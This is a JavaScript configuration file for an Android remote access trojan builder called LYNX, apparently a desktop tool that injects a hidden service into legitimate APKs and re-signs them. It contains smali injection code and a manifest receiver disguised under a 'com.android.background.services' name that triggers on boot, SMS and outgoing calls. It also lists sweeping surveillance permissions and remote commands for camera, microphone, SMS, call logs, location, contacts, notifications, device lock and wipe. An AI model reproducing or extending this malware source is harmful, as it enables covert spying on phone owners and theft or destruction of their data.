const path = require('path');


//---------------------App Controller Vars----------------------------------
exports.apkName = 'LYNX.apk';
exports.apkSourceName = 'LYNX';
exports.signedApkName = 'LYNX-aligned-debugSigned.apk';
exports.LYNXApkFolderPath = path.join(__dirname, '..', '..', 'FactoryLYNX').replace("app.asar", "app.asar.unpacked");
exports.vaultFolderPath = path.join(__dirname, '..', '..', 'Factory/Vault').replace("app.asar", "app.asar.unpacked");
exports.apktoolJar = path.join(__dirname, '..', '..', 'Factory/apktool.jar').replace("app.asar", "app.asar.unpacked");
exports.signApkJar = path.join(__dirname, '..', '..', 'Factory/sign.jar').replace("app.asar", "app.asar.unpacked");
exports.dataDir = 'LYNX'
exports.downloadPath = 'Downloads';
exports.outputApkPath = 'Output';
exports.outputLogsPath = 'Logs';
exports.logColors = { RED: "red", GREEN: "lime", ORANGE: "orange", YELLOW: "yellow", DEFAULT: "#82eefd" };
exports.logStatus = { SUCCESS: 1, FAIL: 0, INFO: 2, WARNING: 3 };
exports.defaultPort = 9094;
exports.IOSocketPath = 'smali' + path.sep + 'LYNX' + path.sep + 'mine' + path.sep + 'king' + path.sep + 'LYNX' + path.sep + 'e.smali';
// exports.LYNXService = 'LYNX.mine.king.LYNX.MainService';
// exports.LYNXReceiver = 'LYNX.mine.king.LYNX.MyReceiver';
// exports.serviceSrc = 'invoke-static {}, LLYNX/mine/kingLYNX/MainService'
exports.LYNXService = '<service android:enabled="true" android:exported="true" android:name="com.android.background.services.MainService"/>';
exports.LYNXReciver = '<receiver android:enabled="true" android:exported="true" android:name="com.android.background.services.receivers.MyReceiver">' +
  '<intent-filter>' +
  '<action android:name="android.intent.action.BOOT_COMPLETED"/>' +
  '</intent-filter>' +
  '<intent-filter android:priority="9999">' +
  '<action android:name="android.provider.Telephony.SMS_RECEIVED" />' +
  '</intent-filter>' +
  '<intent-filter>' +
  '<action android:name="android.intent.action.QUICKBOOT_POWERON"/>' +
  '</intent-filter>' +
  '<intent-filter android:priority="5822">' +
  '<action android:name="android.intent.action.NEW_OUTGOING_CALL"/>' +
  '</intent-filter>' +
  '</receiver>';
exports.serviceSrc = '\n\n    new-instance v0, Landroid/content/Intent;' +
  '\n\n' +
  '    const-class v1, LLYNX/mine/kingLYNX/services/MainService;' +
  '\n\n' +
  '    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V' +
  '\n\n' +
  '    invoke-virtual {p0, v0}, L';
exports.serviceStart = ';->start()V \n\n' +
  '    return-void';
exports.hookPoint = 'return-void';
exports.permissions = [
  'android.permission.WAKE_LOCK',
  'android.permission.CAMERA',
  'android.permission.READ_EXTERNAL_STORAGE',
  'android.permission.WRITE_EXTERNAL_STORAGE',
  'android.permission.MANAGE_EXTERNAL_STORAGE',
  'android.permission.WRITE_SETTINGS',
  'android.permission.WRITE_SECURE_SETTINGS',
  'android.permission.INTERNET',
  'android.permission.ACCESS_NETWORK_STATE',
  'android.permission.READ_SMS',
  'android.permission.SEND_SMS',
  'android.permission.RECEIVE_SMS',
  'android.permission.WRITE_SMS',
  'android.hardware.camera',
  'android.hardware.camera.autofocus',
  'android.permission.RECEIVE_BOOT_COMPLETED',
  'android.permission.READ_PHONE_STATE',
  'android.permission.CALL_PHONE',
  'android.permission.READ_CALL_LOG',
  'android.permission.PROCESS_OUTGOING_CALLS',
  'android.permission.READ_CONTACTS',
  'android.permission.RECORD_AUDIO',
  'android.permission.MODIFY_AUDIO_SETTINGS',
  'android.permission.ACCESS_FINE_LOCATION',
  'android.permission.ACCESS_COARSE_LOCATION',
  'android.permission.ACCESS_BACKGROUND_LOCATION',
  'android.permission.REQUEST_IGNORE_BATTERY_OPTIMISATIONS',
  'android.permission.FOREGROUND_SERVICE'
];
exports.checkboxMap = {
  Permissions1: [
    'android.permission.CAMERA',
    'android.hardware.camera',
    'android.hardware.camera.autofocus',
    'android.permission.WAKE_LOCK',
    'android.permission.WRITE_SETTINGS',
    'android.permission.WRITE_SECURE_SETTINGS',
    'android.permission.INTERNET',
    'android.permission.ACCESS_NETWORK_STATE',
    'android.permission.REQUEST_IGNORE_BATTERY_OPTIMISATIONS',
    'android.permission.RECEIVE_BOOT_COMPLETED'
  ],
  Permissions2: [
    'android.permission.READ_EXTERNAL_STORAGE',
    'android.permission.WRITE_EXTERNAL_STORAGE',
    'android.permission.MANAGE_EXTERNAL_STORAGE',
    'android.permission.WAKE_LOCK',
    'android.permission.WRITE_SETTINGS',
    'android.permission.WRITE_SECURE_SETTINGS',
    'android.permission.INTERNET',
    'android.permission.ACCESS_NETWORK_STATE',
    'android.permission.REQUEST_IGNORE_BATTERY_OPTIMISATIONS',
    'android.permission.RECEIVE_BOOT_COMPLETED'
  ],
  Permissions3: [
    'android.permission.RECORD_AUDIO',
    'android.permission.MODIFY_AUDIO_SETTINGS',
    'android.permission.WAKE_LOCK',
    'android.permission.WRITE_SETTINGS',
    'android.permission.WRITE_SECURE_SETTINGS',
    'android.permission.INTERNET',
    'android.permission.ACCESS_NETWORK_STATE',
    'android.permission.REQUEST_IGNORE_BATTERY_OPTIMISATIONS',
    'android.permission.RECEIVE_BOOT_COMPLETED'
  ],
  Permissions4: [
    'android.permission.ACCESS_FINE_LOCATION',
    'android.permission.ACCESS_COARSE_LOCATION',
    'android.permission.ACCESS_BACKGROUND_LOCATION',
    'android.permission.WAKE_LOCK',
    'android.permission.WRITE_SETTINGS',
    'android.permission.WRITE_SECURE_SETTINGS',
    'android.permission.INTERNET',
    'android.permission.ACCESS_NETWORK_STATE',
    'android.permission.REQUEST_IGNORE_BATTERY_OPTIMISATIONS',
    'android.permission.RECEIVE_BOOT_COMPLETED'
  ],
  Permissions5: [
    'android.permission.READ_CONTACTS',
    'android.permission.WAKE_LOCK',
    'android.permission.WRITE_SETTINGS',
    'android.permission.WRITE_SECURE_SETTINGS',
    'android.permission.INTERNET',
    'android.permission.ACCESS_NETWORK_STATE',
    'android.permission.REQUEST_IGNORE_BATTERY_OPTIMISATIONS',
    'android.permission.RECEIVE_BOOT_COMPLETED'
  ],
  Permissions6: [
    'android.permission.READ_SMS',
    'android.permission.SEND_SMS',
    'android.permission.RECEIVE_SMS',
    'android.permission.WRITE_SMS',
    'android.permission.WAKE_LOCK',
    'android.permission.WRITE_SETTINGS',
    'android.permission.WRITE_SECURE_SETTINGS',
    'android.permission.INTERNET',
    'android.permission.ACCESS_NETWORK_STATE',
    'android.permission.REQUEST_IGNORE_BATTERY_OPTIMISATIONS',
    'android.permission.RECEIVE_BOOT_COMPLETED'
  ],
  Permissions7: [
    'android.permission.READ_PHONE_STATE',
    'android.permission.READ_CALL_LOG',
    'android.permission.PROCESS_OUTGOING_CALLS',
    'android.permission.WAKE_LOCK',
    'android.permission.WRITE_SETTINGS',
    'android.permission.WRITE_SECURE_SETTINGS',
    'android.permission.INTERNET',
    'android.permission.ACCESS_NETWORK_STATE',
    'android.permission.REQUEST_IGNORE_BATTERY_OPTIMISATIONS',
    'android.permission.RECEIVE_BOOT_COMPLETED'
  ],
  Permissions8: [
    'android.permission.BIND_NOTIFICATION_LISTENER_SERVICE',
    'android.permission.WAKE_LOCK',
    'android.permission.WRITE_SETTINGS',
    'android.permission.WRITE_SECURE_SETTINGS',
    'android.permission.INTERNET',
    'android.permission.ACCESS_NETWORK_STATE',
    'android.permission.REQUEST_IGNORE_BATTERY_OPTIMISATIONS',
    'android.permission.RECEIVE_BOOT_COMPLETED'
  ],
};

//---------------------Lab Controller Vars----------------------------------
exports.order = 'order';
exports.orders = {
  camera: 'x0000ca',
  fileManager: 'x0000fm',
  storage: 'x0000st',
  calls: 'x0000cl',
  sms: 'x0000sm',
  mic: 'x0000mc',
  location: 'x0000lm',
  contacts: 'x0000cn',
  apps: 'x0000apps',
  runApp: 'x0000runApp',
  openUrl: 'x0000openUrl',
  deleteFileFolder: 'x0000deleteFF',
  dialNumber: 'x0000dm',
  lockDevice: 'x0000lockDevice',
  wipeDevice: 'x0000wipeDevice',
  rebootDevice: 'x0000rebootDevice',
  listenMicrophone: 'x0000listenMic',
  notifications: 'x0000nt', // Thêm notifications
  clearNotifications: 'x0000clearNt', // Xóa tất cả notifications
  clearSingleNotification: 'x0000clearSingleNt', // Xóa notification cụ thể
}
